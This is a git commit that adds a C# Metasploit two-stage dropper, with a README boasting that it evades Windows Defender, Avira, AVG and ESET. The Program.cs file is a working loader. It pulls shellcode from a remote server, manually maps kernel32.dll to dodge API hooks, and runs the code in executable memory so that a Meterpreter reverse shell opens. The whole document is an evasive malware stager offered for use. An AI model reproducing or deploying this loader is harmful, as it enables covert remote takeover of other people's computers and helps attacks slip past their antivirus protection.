daf7401aec9ebb4aa1471bc20ce376d758143e8f
ikazol <121379514+ikazol@users.noreply.github.com>
2023-08-26 20:16:56 +0300

    main

--- README.md
+++ README.md
@@ -1,2 +1,26 @@
-# MSFStager-DInvoke
- C# Two-Stage dropper using Dynamic Win32 API calls and manual mapping of kernel32.dll
+# MSFStager-DInvoke-MM
+Metasploit C# Two-Stage dropper using Dynamic Win32 API calls and manual mapping of kernel32.dll
+
+As of <u>30-07-2023</u> this results on an undetected Meterpreter session \[at least\] against the following products with default installation settings:
+- Windows Defender
+- Avira Internet Security
+- AVG Antivirus Free
+- ESET Smart Security
+
+## How it works
+
+-Generate a metasploit stager shellcode using the windows/x64/meterpreter/reverse_tcp_rc4 payload and x64/xor encoder
+
+-Python server serves the first stage shellcode
+
+-C# dropper retrieves the first stage shellcode and invokes it using dynamic Win32 API calls (manual mapping of kernel32.dll)
+
+-First stage shellcode connects to multi/handler and retrieves second stage
+
+-Meterpreter session is established
+
+
+https://blindsecurity.gr/site/2023/07/30/av-evasion-using-dinvoke-two-stage-payload-and-rc4-in-meterpreter/
+
+## 
+![alt text](https://github.com/k4z01/MSFStager-DInvoke-MM/blob/main/test.gif?raw=true)
---
+++ Stager/Program.cs
@@ -0,0 +1,63 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net.Sockets;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using DInvoke.DynamicInvoke;
+using DInvoke.Data;
+using System.Diagnostics.Eventing.Reader;
+
+namespace Stager
+{
+    internal class Program
+    {
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr VirtualAllocD(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr CreateThreadD(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        static void Main(string[] args)
+        {
+
+            string lIP = args[0];
+            int lPort = int.Parse(args[1]);
+            IPAddress ipAddress = IPAddress.Parse(lIP);
+            var ipEndPoint = new IPEndPoint(ipAddress, lPort);
+
+            //Connect to the python listening server
+            TcpClient client = new TcpClient();
+            client.Connect(ipEndPoint);
+            NetworkStream stream = client.GetStream();
+
+            //Receive the size of the first stage payload
+            var buffer = new byte[4];
+            stream.Read(buffer, 0, buffer.Length);
+            Int32 stgrSize = BitConverter.ToInt32(buffer, 0);
+
+
+            //Receive the stager shellcode
+            byte[] buf = new byte[stgrSize];
+            stream.Read(buf, 0, buf.Length);
+
+            //Map kernel32.dll to memory
+            PE.PE_MANUAL_MAP kern32DLL = new PE.PE_MANUAL_MAP();
+            kern32DLL = DInvoke.ManualMap.Map.MapModuleToMemory(@"C:\Windows\System32\kernel32.dll");
+
+            //Call VirtualAlloc to reserve memory for the shellcode
+            object[] vaparameters = { IntPtr.Zero, (UInt32)buf.Length, (UInt32)0x3000, (UInt32)0x40 };
+            IntPtr addr = (IntPtr)Generic.CallMappedDLLModuleExport(kern32DLL.PEINFO, kern32DLL.ModuleBase, "VirtualAlloc", typeof(VirtualAllocD), vaparameters, false);
+            //Copy the stager shellcode to the allocated memory
+            Marshal.Copy(buf, 0, addr, buf.Length);
+
+            //Invoke the stager shellcode
+            object[] ctparameters = { IntPtr.Zero, (UInt32)0, addr, IntPtr.Zero, (UInt32)0, IntPtr.Zero };
+            IntPtr hThread = (IntPtr)Generic.CallMappedDLLModuleExport(kern32DLL.PEINFO, kern32DLL.ModuleBase, "CreateThread", typeof(CreateThreadD), ctparameters, false);
+            Console.ReadLine();
+
+        }
+    }
+}
